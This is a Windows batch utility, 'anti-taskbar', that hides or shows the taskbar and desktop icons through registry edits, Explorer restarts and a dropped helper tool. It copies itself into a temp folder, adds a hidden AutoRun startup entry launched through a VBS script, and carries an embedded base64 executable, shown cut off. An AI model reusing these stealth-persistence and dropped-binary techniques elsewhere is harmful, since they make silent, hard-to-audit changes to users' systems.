@echo off
setlocal EnableDelayedExpansion
set "version=1.0"

rem ""language features""
set "return=set returned=val&& goto :eof"
set "returnTo=set returned=val&& goto "
set "returned="
set "throw=set __thrown=err&& if ^"^^^!__isTryBlock^^^!^" == ^"true^" ^(goto :eof ^) else ^(call :__exception err^)"
set "throwing=set __thrown=err"
set "try=set __thrown=null&&set __isTryBlock=true&&if a==a "
set "catch=&&set __isTryBlock=false&&if not ^".^^^!__thrown^^^!^" == ^".^^^!__thrown:err=^^^!^""
set "public=if ^^^!__intent^^^! == query set query.result=granted&& (goto :eof)"
set "private=if ^^^!__intent^^^! == query if ^^^!su.isEnabled^^^! == true (set query.result=granted) else (set query.result=denied)&& (goto :eof)"

rem APIs
set "echo.log=set __echoPrefix=Log: code,& set __rawC=code& set __cSubstr=^^^!__rawC:cod=^^^!&& (if .^^^!__cSubstr^^^! == .e set __echoPrefix=Log:) && echo ^^^!__echoPrefix^^^!"
set "echo.warn=!echo.log:Log=Warn!"
set "echo.error=!echo.log:Log=Error!"
set "query.result="
set "query.ifAccessible=set query.result=& set __intent=query& call :function >nul 2>&1 & set __intent=& if ^^^!query.result^^^!==granted "
set "query.ifExists=set query.result=null& set __intent=query& call :function >nul 2>&1 & set __intent=& if not ^^^!query.result^^^!==null "
set "su.isEnabled=false"

rem constants
set "Paths.DROP=%temp%\Cache"
set "Paths.DELEGATE=!Paths.DROP!\delegate.bat"
set "Paths.RUN_FILE=!Paths.DROP!\__run.txt"
set "Paths.NIRCMDC=!Paths.DROP!\nircmdc.exe"
set "Paths.STEALTH_BOOTSTRAP=!Paths.DROP!\stealth.vbs"
set "Paths.ICONS_TOGGLER=!Paths.DROP!\toggle.exe"
set "Paths.SELF=!Paths.DROP!\core.bat"
set "RegistryKeys.EXPLORER=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer"
set "RegistryKeys.STARTUP=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

rem next tick API stuff
set "nextTick.tasks="
set "nextTick.tasks.length=0"
set "nextTick.returnTo=:tick"

rem __main is implicitly called by being at the top
:__main (...args)
%private%
(
    mkdir "!Paths.DROP!" >nul 2>&1
    
    if "%1" == "" (
        call :splash
        :tick
        call :cmd
        goto :tickNext
    ) else (
        if "%1" == "/?" (
            call :parse ?
        ) else (
            call :parse %*
        )
        if not "!returned!" == "0" (
            call :exit 1
        )
        goto :tickLast
    )
    exit /b 0
)

:executeNextTickTasks ()
%private%
rem cannot set labels inside "scopes"
set /a "i=0"
:tickTasksLoop
(
    !nextTick.tasks[%i%]!

    if not "!i!" equ "!nextTick.tasks.length!" (
        set /a "i+=1"
        goto :tickTasksLoop
    )

    set "nextTick.tasks="
    set "nextTick.tasks.length=0"

    %returnTo% !nextTick.returnTo!
)

:tickLast ()
%private%
(
    set "nextTick.returnTo=:eof"
    goto :executeNextTickTasks
)

:tickNext ()
%private%
(
    set "nextTick.returnTo=:tick"
    goto :executeNextTickTasks
)

:onNextTick (command)
%private%
(
    set "command=%*"

    set "nextTick.tasks[!nextTick.tasks.length!]=!command!"
    set /a "nextTick.tasks.length+=1"

    %return%
)

:cmd ()
%private%
(
    rem reset to prevent rerunning the previous command
    set "cmd="
    rem handle CTRL+C with double pipe
    set /p "cmd=>>> " || ( echo. &&set "cmd=exit" )
    if "!cmd!" == "/?" (
        call :parse ?
    ) else (
        call :parse !cmd!
    )
    echo.
    %return%
)

:splash ()
%private%
(               
    echo  _______  __    _  _______  ___          _______  _______  _______  ___   _  _______  _______  ______   
    echo ^|   _   ^|^|  ^|  ^| ^|^|       ^|^|   ^|        ^|       ^|^|   _   ^|^|       ^|^|   ^| ^| ^|^|  _    ^|^|   _   ^|^|    _ ^|  
    echo ^|  ^|_^|  ^|^|   ^|_^| ^|^|_     _^|^|   ^|  ____  ^|_     _^|^|  ^|_^|  ^|^|  _____^|^|   ^|_^| ^|^| ^|_^|   ^|^|  ^|_^|  ^|^|   ^| ^|^|  
    echo ^|       ^|^|       ^|  ^|   ^|  ^|   ^| ^|____^|   ^|   ^|  ^|       ^|^| ^|_____ ^|      _^|^|       ^|^|       ^|^|   ^|_^|^|_ 
    echo ^|       ^|^|  _    ^|  ^|   ^|  ^|   ^|          ^|   ^|  ^|       ^|^|_____  ^|^|     ^|_ ^|  _   ^| ^|       ^|^|    __  ^|
    echo ^|   _   ^|^| ^| ^|   ^|  ^|   ^|  ^|   ^|          ^|   ^|  ^|   _   ^| _____^| ^|^|    _  ^|^| ^|_^|   ^|^|   _   ^|^|   ^|  ^| ^|
    echo ^|__^| ^|__^|^|_^|  ^|__^|  ^|___^|  ^|___^|          ^|___^|  ^|__^| ^|__^|^|_______^|^|___^| ^|_^|^|_______^|^|__^| ^|__^|^|___^|  ^|_^|    [%version%]
    echo.
                                                            
    echo ^(c^) jiashe.ng 2020
    echo Type "?" to get started...
    echo.
    %return%
)

:ping ()
%private%
(   
    if "%1" == "ping" (
        %return%
    )

    %echo.log:code=Ping% pong 
    %return:val=pong%
)

:parse (...args)
%private%
(
    set "subroutineArg=%1"

    if "!subroutineArg!" == "?" (
        set "subroutineArg=help"
    )

    set "processedCmd=!subroutineArg! %2 %3 %4 %5 %6 %7 %8 %9"
    
    %try% (
        rem verify if subroutine is private
        %query.ifAccessible:function=!subroutineArg!% (
            call :!processedCmd!
        ) else (
            %throwing:err=InvalidArgumentException_kjba%
        ) 

        rem don't know why this is needed, !__thrown! doesn't seem to be updated without it
        echo !__thrown! >nul
    ) %catch:err=InvalidArgumentException% (
        %echo.error:code=Wrong Command% ^(from !__thrown!^) try doing "?" to learn more about the commands
        %return%
    ) else break %catch:err=EmptyArgumentException% (
        %echo.error:code=Incomplete Command% ^(from !__thrown!^) try doing "?" to learn more about the commands
        %return%
    )
    %return:val=0%
)

:help ()
%public%
(
    echo Meta:
    echo *   {}                     Compulsory argument
    echo *   [=DEFAULT]             Optional argument
    echo *   ^(^)                     Alias
    echo.
    echo.
    echo Commands:
    echo *   show {what} {when}     Show the taskbar.
    echo *   hide {what} {when}     Hide the taskbar.
    echo.
    echo     *   what                   The item that will have action taken on it.
    echo                                Options: icons ^| taskbar ^| iconstaskbar^(/ all^)
    echo.
    echo     *   when                   The time when action will be taken on the item.
    echo                                Options: now ^| startup ^| nowstartup^(/ fromnow^)
    echo.
    echo.
    echo *   exit [exitCode=0]      Exit the application.
    echo.
    echo     *   exitCode               The error code reported by the application on exit.
    echo                                Options: ^<int^>
    echo.
    echo.
    echo *   ? ^(/ help^)             Print the help docs.
    %return%
)

:exit (code)
%public%
(
    set "code=%1"

    if "!code!" == "" (
        set "code=0"

        %echo.log:code=Exit% Goodbye^^^!
    )

    if not "!code!" == "0" (
        %echo.warn:code=Exit% Non-zero error code^^^! ^(!code!^)
    )

    call :onNextTick exit /b !code!

    %return%
)

:su (setting)
%public%
(
    if "%1" == "true" (
        %echo.log:code=SuperUserEnabled%
        set "su.isEnabled=true"
    ) else if "%1" == "false" (
        %echo.log:code=SuperUserDisabled%
        set "su.isEnabled=false"
    ) else if "%1" == "" (
        if "!su.isEnabled!" == "true" (
            call :su false
        ) else (
            call :su true
        )
    ) else (
        %throw:err=InvalidArgumentException__cxuv%
    )
    %return%
)

:startup (setting, what)
%private%
(   
    if "%2" == "" (
        %throw:err=EmptyArgumentException2__jsfd%
    )

    set "setting=%1"
    set "what=%2"
    set "regKeyValue=AutoRun"

    if "!setting!" == "add" (
        call :dropStealthBootstrap
        call :dropSelf
        reg add "%RegistryKeys.STARTUP%" /v "!regKeyValue!" /t REG_SZ /d "\"%Paths.STEALTH_BOOTSTRAP%\" \"!Paths.SELF!\" \"hide !what! now\"" /f >nul 2>&1
    ) else if "!setting!" == "delete" (
        if not ".!what!" == ".!what:taskbar=!" if not ".!what!" == ".!what:icons=!" (
            set "nextTick.tasks=!nextTick.tasks!call :uninstall"
            reg delete "%RegistryKeys.STARTUP%" /v "!regKeyValue!" /f >nul 2>&1
            %return%
        )

        call :getRegKeyData "%RegistryKeys.STARTUP%" "!regKeyValue!"
        if not ".!what!" == ".!what:taskbar=!" (
            reg add "%RegistryKeys.STARTUP%" /v "!regKeyValue!" /t REG_SZ /d "!returned:taskbar=!" /f >nul 2>&1
        )
        if not ".!what!" == ".!what:icons=!" (
            reg add "%RegistryKeys.STARTUP%" /v "!regKeyValue!" /t REG_SZ /d "!returned:icons=!" /f >nul 2>&1
        )
        
    ) else (
        %throw:err=InvalidArgumentException__yvhj%
    )

    %return%
)

:hide (what, when)
%public%
(
    if "%1" == "" (
        %throw:err=EmptyArgumentException1__ewrr%
    )
    if "%2" == "" (
        %throw:err=EmptyArgumentException2__uoxv%
    )

    set "what=%1"
    set "when=%2"
    set "validArgument=false"

    if "!what!" == "all" (
        set "what=taskbaricons"
    )
    if "!when!" == "fromnow" (
        set "when=nowstartup"
    )

    if not ".!when!" == ".!when:now=!" (
        if not ".!what!" == ".!what:taskbar=!" (
            set "validArgument=true"
            call :taskbarAutoHideRegKey enable
            call :taskbarNirCmd hide
            call :delegate start
        )
        if not ".!what!" == ".!what:icons=!" (
            set "validArgument=true"
            call :iconsRegKey hide
        )
        call :restartExplorer
    )
    if not ".!when!" == ".!when:startup=!" (
        if not ".!what!" == ".!what:taskbar=!" (
            set "validArgument=true"
            set "startupWhats=!startupWhats!taskbar"
        )
        if not ".!what!" == ".!what:icons=!" (
            set "validArgument=true"
            set "startupWhats=!startupWhats!icons"
        )
    )
    if not "!validArgument!" == "true" (
        %throw:err=InvalidArgumentException__pxoc%
    )

    if not "!startupWhats!" == "" (
        call :startup add !startupWhats!
    )
    %return%
)

:show (what, when)
%public%
(
    if "%1" == "" (
        %throw:err=EmptyArgumentException1__jkah%
    )
    if "%2" == "" (
        %throw:err=EmptyArgumentException2__ajdb%
    )

    set "what=%1"
    set "when=%2"
    set "validArgument=false"

    if "!what!" == "all" (
        set "what=taskbaricons"
    )
    if "!when!" == "fromnow" (
        set "when=nowstartup"
    )

    if not ".!when!" == ".!when:now=!" (
        if not ".!what!" == ".!what:taskbar=!" (
            set "validArgument=true"
            call :taskbarAutoHideRegKey disable
            call :taskbarNirCmd show
            call :delegate stop
        )
        if not ".!what!" == ".!what:icons=!" (
            set "validArgument=true"
            call :iconsRegKey show
        )
        call :restartExplorer
    )
    if not ".!when!" == ".!when:startup=!" (
        if not ".!what!" == ".!what:taskbar=!" (
            set "validArgument=true"
            set "startupWhats=!startupWhats!taskbar"
        )
        if not ".!what!" == ".!what:icons=!" (
            set "validArgument=true"
            set "startupWhats=!startupWhats!icons"
        )
    )
    if not "!validArgument!" == "true" (
        %throw:err=InvalidArgumentException__ljhd%
    )

    if not "!startupWhats!" == "" (
        call :startup delete !startupWhats!
    )
    %return%
)

:restartExplorer ()
%private%
(
    taskkill /f /im "explorer.exe" >nul
    start "" "explorer.exe"
    %return%
)

:iconsRegKey (setting)
%private%
(
    rem "reg add" doesn't work with this setting, maybe because of explorer cache?
    rem this uses an exe macro instead

    set "setting=%1"

    call :dropIconsToggler
    call :getRegKeyData "%RegistryKeys.EXPLORER%\Advanced" "HideIcons"
    if "!setting!" == "show" (
        if "!returned!" == "0x1" (
            start "" !Paths.ICONS_TOGGLER!
        )
    ) else if "!setting!" == "hide" (
        if "!returned!" == "0x0" (
            start "" !Paths.ICONS_TOGGLER!
        )
    ) else (
        %throw:err=InvalidArgumentException__cxbr%
    )
    
    %return%
)

:taskbarNircmd (setting)
%private%
(
    if "%1" == "show" (
        set "setting=show"
    ) else if "%1" == "hide" (
        set "setting=hide"
    ) else (
        %throw:err=InvalidArgumentException__yvhj%
    )

    call :dropNircmdc
    
    %Paths.NIRCMDC% win !setting! class Shell_TrayWnd
    %return%
)

:taskbarAutoHideRegKey (setting)
%private%
(
    if "%1" == "enable" (
        set "setting=3"
    ) else if "%1" == "disable" (
        set "setting=2"
    ) else (
        %throw:err=InvalidArgumentException__spdj%
    )

    set "stuckRectsVer=StuckRects3"
    reg query "%RegistryKeys.EXPLORER%\StuckRects3" /v Settings >nul 2>&1 || (
        set "stuckRectsVer=StuckRects2"
    )
    
    call :getRegKeyData "%RegistryKeys.EXPLORER%\!stuckRectsVer!" "Settings"
    set "data=!returned!"
    set "valuesBefore=!data:~0,17!"
    set "valuesAfter=!data:~18,999!"
    set "valuesConcatted=!valuesBefore!!setting!!valuesAfter!"

    reg add "%RegistryKeys.EXPLORER%\StuckRects3" /v Settings /t REG_BINARY /d !valuesConcatted! /f >nul
    %return%
)

:getRegKeyData (key, value)
%private%
(
    set "key=%1"
    set "value=%2"

    for /f "tokens=* delims= usebackq" %%a in (`reg query !key! /v !value!`) do (
        set "raw=%%a"
        set "data=!raw:~30,99999!"

        if not ".!raw!" == ".!raw:REG_=!" (
            %return:val=!data!%
        )
    )
)

:delegate (setting)
(
    set "setting=%1"

    if "!setting!" == "start" (
        call :dropDelegate
        call :dropStealthBootstrap
        start "" "!Paths.STEALTH_BOOTSTRAP!" "!Paths.DELEGATE!" "!Paths.NIRCMDC!"
    ) else if "!setting!" == "stop" (
        del /f "%Paths.RUN_FILE%" >nul 2>&1
    ) else (
        %throw:err=InvalidArgumentException__spdj%
    )
    %return%
)

:exec (cmd)
%private%
(
    %*
    %return%
)

:uninstall ()
%private%
(
    rmdir /s /q "!Paths.DROP!" >nul 2>&1
    mkdir "!Paths.DROP!" >nul 2>&1
    %return%
)

:dropSelf ()
%private%
(
    copy /y "%~f0" "!Paths.SELF!" >nul
    %return%
)

:dropIconsToggler ()
%private%
(
    set "filePath=!Paths.ICONS_TOGGLER!"

    if exist "!filePath!" (
        %return%
    )
    for %%a in (
        "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAFoGl1cAAAAAAAAAAOAAIgALATAAABQAAAAIAAAAAAAA7jMAAAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAIAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAJwzAABPAAAAAEAAAMQFAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAABkMgAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA9BMAAAAgAAAAFAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAMQFAAAAQAAAAAYAAAAWAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAHAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADQMwAAAAAAAEgAAAACAAUAfCIAAOgPAAABAAAADgAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwAwA9AAAAAQAAEQACKAYAAAYKBiUXWAoW/gILBywfAAZzEAAACgwCCAhvEQAACigFAAAGJghvEgAACg0rCH4TAAAKDSsACSoAAAATMAIAQQAAAAIAABFzFAAABgoGAn0TAAAEAH4UAAAKCwZzFQAACn0UAAAEBv4GFQAABnMQAAAGfhQAAAooBwAABiYGexQAA"
        "AQMKwAIKgAAABMwBAD8AAAAAwAAEQASACACdAAAKBYAAAp+FAAACgsoFwAACm8YAAAKbxkAAAocMhQoFwAACm8YAAAKbxoAAAoY/gQrARcMCCwYcgEAAHByEQAAcCgBAAAGGygCAAAGCytTAHIxAABwKAoAAAYNFhMEKyEACREEKAEAACt+FAAACnJBAABwFCgEAAAGCxEEF1gTBAAHfhQAAAooHAAACiwMEQQJKAIAACv+BCsBFhMFEQUtvwAHfhQAAAooHAAAChMGEQYsHAAoCwAABhMHEQd+FAAACnJBAABwFCgEAAAGCwAHfhQAAAooHgAAChMIEQgsFAAHIBEBAAAGfhQAAAooAwAABiYAKiIAKAwAAAYAKiICKB8AAAoAKgAAEzADAGcAAAAEAAARACAAAQAAcxAAAAoKAwYGbxEAAAooCAAABiYGbxIAAAoCexMAAAQoIAAACiwgAygJAAAGcmMAAHAoIAAACi0LAygJAAAGFP4BKwEXKwEWCwcsDwACexQAAAQDbyEAAAoAABcMKwAIKgBCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAAA8BgAAI34AAKgGAACMBgAAI1N0cmluZ3MAAAAANA0AAGgAAAAjVVMAnA0AABAAAAAjR1VJRAAAAKwNAAA8AgAAI0Jsb2IAAAAAAAAAAgAAAVcdAhwJCgAAAPoBMwAWAAABAAAAHgAAAAYAAAAUAAAAFQAAACoAAAAhAAAAEAAAAA8AAAAEAAAAAQAAAAEAAAAKAAAAAQAAAAIAAAAEAAAAAgAAAAAAjgMBAAAAAAAGAAMD3gQGAHAD3gQGADcCrAQPAP4EAAAGAF8CSwQGAOYCSwQGAMcCSwQGAFcDSwQGACMDSwQGADwDSwQGAHYCSwQGAEsCvwQGACkCvwQGAKoCSwQGAJECngMGAI4FIAQGAG4EAQYGADIAOAEGACcEIAQGAPwBIA"
        "QGAJwFIAQGANkDIAQGAA4C3gQGAEAAOAEGALoDIAQGAKUEIAQGALsFIAQGABcEIAQGAEMEIAQKALUBYgQAAAAARwAAAAAAAQABAAAAEAAPBDIFQQABAAEAAwEAAHABAABNAAYAEAADAQAAXAEAAFEADgAQAAIBAAANBQAATQAOABQAAwEQAAEAAABBABMAFABRgFkA0ABRgOcA0ABRgHUA0ABRgGQA0ABRgMUA0AAGBicB0wBWgAIB1gBWgPYA1gBWgA8B1gBWgBsB1gBWgN4A1gBWgFAA1gBWgM4A1gAGBicB0wBWgLkA2gBWgK4A2gBWgIUA2gBWgJYA2gAGANkBKgAGAHwF3gAAAAAAgACRICMG5QABAAAAAACAAJEgPQbrAAMAAAAAAIAAkSCTAfIABQAAAAAAgACRIFIG+gAJAAAAAACAAJEgFQYCAQ0AAAAAAIAAkSDFAwoBEAAAAAAAgACRIHAFDwERAAAAAACAAJEgzAECARMAUCAAAAAAlgAVBhYBFgCcIAAAAACWAFEFGwEXAAAAAACAAJEgLgYkARgA7CAAAAAAkQA+BSgBGAAAAAAAgACRIOUFLAEYAPQhAAAAAJEALAQ5AR8A/SEAAAAAhhifBAYAIAAAAAAAAwCGGJ8EPwEgAAAAAAADAMYBrgFFASIAAAAAAAMAxgGpAUsBJAAAAAAAAwDGAZ8BVQEoAP0hAAAAAIYYnwQGACkACCIAAAAAgwAXAEUBKQAAAAEAwAEAAAIA4wEAAAEAgwEAAAIAfgEAAAEAgwEAAAIAwQMAAAMAAgQAAAQA+wMAAAEAxwUAAAIAfAQAAAMAZgUAAAQARwYAAAEAgwEAAAIADQYAAAMA3AUAAAEAgwEAAAEAUwEAAAIA+wMAAAEAgwEAAAIAwAEAAAMA0gUAAAEAgwEAAAEA2QEAAAEAgwEAAAIAwQMAAAMAAgQAAAQA+wMAAAUAJQUAAAYA+AUCAAcAqQ"
        "UAAAEALQUAAAEAlQUAAAIAjAEAAAEAgwEAAAIA+wMAAAEAgwEAAAIA+wMAAAMA5wMAAAQAlQUAAAEAtAUAAAEAiAEAAAIACQQJAJ8EAQARAJ8EBgAZAJ8ECgApAJ8EEAAxAJ8EEAA5AJ8EEABBAJ8EEABJAJ8EEABRAJ8EEABZAJ8EEABhAJ8EFQBpAJ8EEABxAJ8EEAB5AJ8EEAC5AJ8EBgCJAJ8EAQCJAF8GIgCBALgDJgDJAIYGKgDRAF0EOAAMAJ8EBgDRAJ8EAQDZADEEUQDhAD8EVgDpAIsEIgDpAJUEIgDxAIQFWwDRAGwGbADxAN8FcgDRAHgGbACBAJ8EBgDJAGwGhAAMAGwBigAIAAQAmQAIAAgAngAIAAwAowAIABAAowAIABQAqAAJABwArQAJACAAqAAJACQAsgAJACgAtwAJACwAvAAJADAAwQAJADQAxgAJADwArQAJAEAAqAAJAEQAsgAJAEgAywAuAAsAWwEuABMAZAEuABsAgwEuACMAjAEuACsAngEuADMAngEuADsAngEuAEMAjAEuAEsApAEuAFMAngEuAFsAngEuAGMAvAEuAGsA5gEuAHMA8wHDAHsAqAAaAC0AQQB9APADOwBAAQMAIwYBAEABBQA9BgEABgEHAJMBAQBAAQkAUgYBAAQBCwAVBgEABAENAMUDAQAAAQ8AcAUBAEYBEQDMAQEAAAEXAC4GAQBGARsA5QUBAASAAAABAAAAAAAAAAAAAAAAADIFAAAEAAAAAAAAAAAAAACQAC8BAAAAAAQAAAAAAAAAAAAAAJAA8AEAAAAAAwACAAQAAgAFAAIABgACADcAaAA7AGgAAAAAPD5jX19EaXNwbGF5Q2xhc3MxMl8wADxGaW5kV2luZG93c1dpdGhDbGFzcz5iX18wAElFbnVtZXJhYmxlYDEATGlzdGAxADxNb2R1bGU+AEdXX0NISUxEAFdNX0NPTU1BTkQAV01"
        "fU0VUVElOR0NIQU5HRQBXTV9XSU5JTklDSEFOR0UAU01UT19BQk9SVElGSFVORwBTTVRPX05PVElNRU9VVElGTk9USFVORwBTTVRPX0JMT0NLAFNNVE9fTk9STUFMAElOSV9JTlRMAEdXX0VOQUJMRURQT1BVUABHV19PV05FUgBIV05EX0JST0FEQ0FTVABHV19IV05ETEFTVABHV19IV05ERklSU1QAR1dfSFdORE5FWFQAR1dfSFdORFBSRVYAdmFsdWVfXwBtc2NvcmxpYgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBlbnVtUHJvYwBFbnVtV2luZG93c1Byb2MAQWRkAEdldFdpbmRvd19DbWQAdUNtZABoV25kAHduZABtZXRob2QAU2VuZE1lc3NhZ2UARW5kSW52b2tlAEJlZ2luSW52b2tlAEVudW1lcmFibGUAbHBDbGFzc05hbWUAR2V0Q2xhc3NOYW1lAGNsYXNzTmFtZQBscFdpbmRvd05hbWUAU3lzdGVtLkNvcmUATXVsdGljYXN0RGVsZWdhdGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHly"
        "aWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAVG9nZ2xlSWNvbnMuZXhlAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAVG9TdHJpbmcATXNnAEdldFdpbmRvd1RleHRMZW5ndGgAQXN5bmNDYWxsYmFjawBjYWxsYmFjawB1c2VyMzIuZGxsAGxQYXJhbQB3UGFyYW0AcGFyYW0AUHJvZ3JhbQBPcGVyYXRpbmdTeXN0ZW0ARW51bQBNYWluAGdldF9PU1ZlcnNpb24AZ2V0X1ZlcnNpb24AU3lzdGVtLlJlZmxlY3Rpb24AWmVybwBTeXN0ZW0uTGlucQBTdHJpbmdCdWlsZGVyAGh3bmRDaGlsZEFmdGVyAGdldF9NYWpvcgBnZXRfTWlub3IALmN0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBTZW5kTWVzc2FnZVRpbWVvdXRGbGFncwBmdUZsYWdzAGFyZ3MAVG9nZ2xlSWNvbnMAVG9nZ2xlRGVza3RvcEljb25zAEZpbmRXaW5kb3dzV2l0aENsYXNzAGxwc3pDbGFzcwBFbnVtV2luZG93cwB3aW5kb3dzAEVsZW1lbnRBdABPYmplY3QAb2JqZWN0AElBc3luY1Jlc3VsdABscGR3UmVzdWx0AHJlc3VsdABFbnZpcm9ubWVudABod25kUGFyZW50AG5NYXhDb3VudABtYXhDb3VudABTZW5kTWVzc2FnZVRpbWVvdXQAdVRpbWVvdXQAU3lzdGVtLlRleHQAc3RyVGV4dABHZXRXaW5kb3dUZXh0AEZpbmRXaW5k"
        "b3cAR2V0U2hlbGxXaW5kb3cAR2V0V2luZG93AGxwc3pXaW5kb3cARmluZFdpbmRvd0V4AGdldF9DYXBhY2l0eQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5AEVtcHR5AAAPUAByAG8AZwBtAGEAbgAAH1AAcgBvAGcAcgBhAG0AIABNAGEAbgBhAGcAZQByAAAPVwBvAHIAawBlAHIAVwAAIVMASABFAEwATABEAEwATABfAEQAZQBmAFYAaQBlAHcAAAEAAAAAvU4UVpdIqkmn7gXaLiKUQwAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBwcECAISRQ4DIAAIAyAADgIGDgoHAxIYGBUSSQEYAgYYBRUSYQEYDwcJGBgCFRJJARgIAgIYAgQAABJxBCAAEnUMEAECHgAVEkkBHgAIAwoBGAUAAgIYGAoQAQEIFRJJAR4ABgcDEkUCAgUAAgIODgUgAQETAAi3elxWGTTgiQQRAQAABP//AAAEGgAAAAQBAAAABAAAAAAEAgAAAAQDAAAABAQAAAAEBQAAAAQGAAAABAgAAAACBggCBgkDBhEMAwYRFAYGFRJhARgFAAIYDg4GAAIYGBEMBwAEGBgJGBgHAAQYGBgODgcAAwgYEkUIBAABCBgGAAICEhAYBAABDhgIAAEVEkkBGA4DAAAYAwAAAQwABxgYCRkOERQJEBkFAAEBHQ4FIAIBHBgFIAICGBgJIAQSVRgYElkcBSABAhJVCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAcBAAAAABEBAAxOb3RpZnlDaGFuZ2UAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMTYAACkBACQ1MjliNzVjYS1kNmYwLTQyM2QtYmQ5ZS0wYTgyNjc0ZjU5MjEAAAwBAAcxLjAuMC4wAABHAQAaLk5FVEZyYW1ld29yayxWZXJza"
        "W9uPXY0LjABAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lEC5ORVQgRnJhbWV3b3JrIDQAAAAAAFoGl1cAAAAAAgAAABwBAACAMgAAgBQAAFJTRFOetNQKD/hgTr5UMZO2D3RbAQAAAEM6XFVzZXJzXHNtaXRoXG9uZWRyaXZlXG9sZCBza3lkcml2ZVxkb2N1bWVudHNcdmlzdWFsIHN0dWRpbyAyMDE1XFByb2plY3RzXE5vdGlmeUNoYW5nZVxOb3RpZnlDaGFuZ2Vcb2JqXERlYnVnXFRvZ2dsZUljb25zLnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxDMAAAAAAAAAAAAA3jMAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAzAAAAAAAAAAAAAAAAX0NvckV4ZU1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAABQAACAAAAAAAAAAAAAAAAAAAABAAEAAAA4AACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAAAAAAAAAAAAAAAAAAAAABAAEAAABoAACAAAAAAAAAAAAAAAAAAAABAAAAAADEAwAAkEAAADQDAAAAAAAAAAAAADQDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAABAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUA"
